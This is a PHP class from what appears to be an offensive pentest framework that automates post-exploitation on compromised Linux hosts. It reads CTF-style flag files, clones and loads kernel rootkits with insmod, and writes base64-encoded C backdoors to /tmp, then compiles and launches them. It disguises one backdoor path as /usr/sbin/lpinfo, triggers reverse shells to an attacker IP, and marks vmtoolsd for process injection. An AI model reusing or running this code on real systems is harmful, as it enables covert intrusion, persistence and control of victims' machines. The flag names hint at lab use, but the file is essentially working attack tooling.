<?php

class root4linux extends check4linux8users{
    
    var $etc_shadow_str ;
    
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass);        
    }
    
    
    
    public function lan4pentest(){
        $result = "";
        $this->titre(__FUNCTION__);
        
        $this->port2root($this->templateB64_cmd);
        
        $tab_flag_name = array("user.txt","root.txt","flag.txt");
        foreach ($tab_flag_name as $flag_name){
            //if (!$this->lan2file4exist($flag_name)){
            $flag_path = $this->lan2file4locate($flag_name);
            $data = "cat $flag_path";
            $this->lan2stream4result($data, $this->stream_timeout*3);
            //}
        }
        
        
        $this->root2backdoor();
        
        
        return $result;
        
        $shell = $this->lan2shell();$this->article("SHELL",$shell);$result .= $shell ; $this->pause();
        $os = $this->lan2os();$this->article("OS",$os); $result .= $os ; $this->pause();
        $info = $this->lan2infos(); $this->article("INFOS",$info);$result .= $info ; $this->pause();
        $users = $this->lan2users();$this->article("USERS",$users); $result .= $users ; $this->pause();
        $lhost = $this->lan2lhost();$this->article("LHOST",$lhost);$result .= $lhost; $this->pause();
        $network = $this->lan2network();$this->article("NETWORK",$network);$result .= $network;      $this->pause();
        $bins = $this->lan2bins();$this->article("BINS",$bins);$result .= $bins ;  $this->pause();
        $hw = $this->lan2hw();$this->article("HW",$hw);$result .= $hw ; $this->pause();
        $ps = $this->lan2ps();$this->article("PS",$ps);$result .= $ps ; $this->pause();
        $tools = $this->lan2tools();$this->article("TOOLS",$tools);$result .= $tools; $this->pause();
        $pids = $this->lan2pid();$this->article("PIDs",$pids);$result .= $pids ; $this->pause();
        
        
        
        return $result;
    }
    
    
    
    
    
    public function root2rootkit(){
        // https://github.com/milabs/awesome-linux-rootkits
        // https://github.com/bones-codes/the_colonel
        // https://github.com/d30sa1/RootKits-List-Download
        // https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Rootkits.md
        $this->gtitre(__FUNCTION__);
        if (!$this->ip2backdoor8db($this->ip2id)) $this->root2backdoor();
        $this->root2rootkit4kerneland();
        $this->root2rootkit4userland();
    }
    
    
    public function root2rootkit4userland(){
        $this->titre(__FUNCTION__);
        
        
        
    }
    
    
    public function root2rootkit4kerneland(){
        $this->titre(__FUNCTION__);
        $this->root2rootkit4kerneland2lkm();
        $this->root2rootkit4kerneland2tyton();
    }
    
    public function root2rootkit4kerneland2lkm(){
        $this->ssTitre(__FUNCTION__);
        // https://github.com/croemheld/lkm-rootkit
        $query = "git clone https://github.com/croemheld/lkm-rootkit.git /tmp/lkm_rootkit ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "cd /tmp/lkm_rootkit && make && make load";
        $this->lan2stream4result($query,$this->stream_timeout);
    }
    
    public function root2rootkit4kerneland2tyton(){
        $this->ssTitre(__FUNCTION__);
        // https://github.com/nbulischeck/tyton
        $query = "apt install linux-headers-$(uname -r) gcc make libnotify-dev pkg-config libgtk-3-dev libsystemd-dev";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "git clone https://github.com/nbulischeck/tyton.git /tmp/tyton ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "cd /tmp/tyton && make && insmod tyton.ko";
        $this->lan2stream4result($query,$this->stream_timeout);
    }
    
    
    public function root2backdoor2udp($attacker_ip,$attacker_port){
        $this->ssTitre(__FUNCTION__);
        $sbin_path_hidden = "";
        $rev_id = $this->backdoor8c2udp($sbin_path_hidden, $attacker_ip, $attacker_port);
        $rootkit_path = "/tmp/root2backdoor_udp";
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $attacker_protocol = "U";
        
        $cmd2 = "ping $this->ip -c 1 -s 100";
        $this->cmd("localhost",$cmd2);
        
        $templateB64_cmd = base64_encode($cmd2);
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
        //$cmd1 = "nc -l -u -p $attacker_port -v ";
        $time = 5 ;
        
        $this->exec_parallel($cmd1, $cmd2, $time);
        $this->pause();
    }
    
    
    public function root2backdoor2tcp($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
        $this->ssTitre(__FUNCTION__);
        $rev_id = $this->backdoor8c2tcp($sbin_path_hidden, $attacker_ip, $attacker_port);
        $rootkit_path = "/tmp/root2backdoor_tcp";
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -ef | grep $sbin_path_hidden";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        $cmd2 = "echo '$this->root_passwd' | sudo -S hping3 -I $this->eth -c 1 --icmptype 8 --icmp-ipid 1337 $this->ip";
        $this->cmd("localhost",$cmd2);
        $templateB64_cmd = base64_encode($cmd2);
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
        //$cmd1 = "nc -l -p $attacker_port -v ";
        $time = 5 ;
        
        $this->exec_parallel($cmd1, $cmd2, $time);
        $this->pause();
    }
    
    
    public function root2backdoor2tcp2poc4prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
        $this->ssTitre(__FUNCTION__);
        //https://github.com/andreafabrizi/prism
        
        $rev_id = $this->backdoor8c2tcp2($sbin_path_hidden, $attacker_ip, $attacker_port);
        $rootkit_path = "/tmp/root2backdoor_prism";
        $this->str2file($rev_id, $rootkit_path);
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $this->pause();
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -ef | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -ef | grep udevd";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep udevd";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        
        $query = "$rootkit_path Inf0";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "socat - EXEC:\"$rootkit_path\",pty,stderr,setsid,sigint,ctty,sane";
        //$this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep udevd";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        
        $cmd2 = "echo \"$this->root_passwd\" | sudo -S python $this->dir_c/sendPacket.py $this->ip p4ssw0rd $attacker_ip $attacker_port";
        $this->cmd("localhost",$cmd2);
        
        $templateB64_cmd = base64_encode($cmd2);
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        
        //$obj_lan = new check4linux($this->eth,$this->domain,$this->ip, $this->port, $this->protocol,$this->stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
        
        
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
        //$cmd1 = "nc -l -p $attacker_port -v ";
        
        $time = 5 ;
        
        
        $this->exec_parallel($cmd1, $cmd2, $time);
        $this->pause();
    }
    
    
    public function root2backdoor(){
        $this->titre(__FUNCTION__);
        
        $sql_ip = "UPDATE IP SET ip2backdoor=1 WHERE $this->ip2where  ";
        $this->mysql_ressource->query($sql_ip);
        
        $sbin = array();
        $sbin_path_hidden = "/usr/sbin/lpinfo";
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        
        $data = "lsof -nPi ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("Services");
        $data = "service --status-all";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/service 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->ssTitre("Investigation Module By Name");
        $data = "lsmod";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /proc/modules";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls /sys/module";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "modinfo";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("This is usually enabled on newer systems, such as RHEL 6.
It provides information as to what process is running on which cpu.
This can be handy to get a list of processes and their PID number.");
        $data = "cat /proc/sched_debug";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $attacker_protocol = "T";
        $filter = "| grep root | awk '{print $11}' | grep '/usr/sbin/' | grep -Po \"^/[[:print:]]{1,}\" | sort -u";
        $query = "ps -aux ";
        $rst_tmp = $this->lan2stream4result($query,$this->stream_timeout);
        $query = "echo \"$rst_tmp\" $filter  | grep '/usr/sbin/' | grep -Po \"^/[[:print:]]{1,}\" | sort -u";
        //$this->requette($query);
        exec($query,$sbin);
        //var_dump($sbin);
        $rst_sbin = $this->tab($sbin);
        $this->rouge("Interesting Injection into SBIN", $rst_sbin);
        $this->article("SBIN", $rst_sbin);
        $this->pause();
        
        $query = "echo \"$rst_tmp\" | grep '/usr/bin/vmtoolsd' | awk '{print $2}' ";
        //$this->requette($query);
        exec($query,$tmp);
        //var_dump($sbin);
        $pid = $this->tab($tmp);
        $this->rouge("Injecting into PID vmtoolsd", $pid);
        $this->pause();
        
        
        $attacker_port = rand(1024,65535);
        $this->root2backdoor2tcp2poc4prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause(); // OK
        $attacker_port = rand(1024,65535);
        $this->root2backdoor2tcp($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause();
        $attacker_port = rand(1024,65535);
        //$this->root2backdoor2udp($attacker_ip,$attacker_port);$this->pause();
        
        
        
        
    }
    
    
    public function root2backdoor8inject2pid($pid){
        
    }
    
    
    
    public function root2backdoor8inject2app($app){
        
    }
    
    
    
}
?>
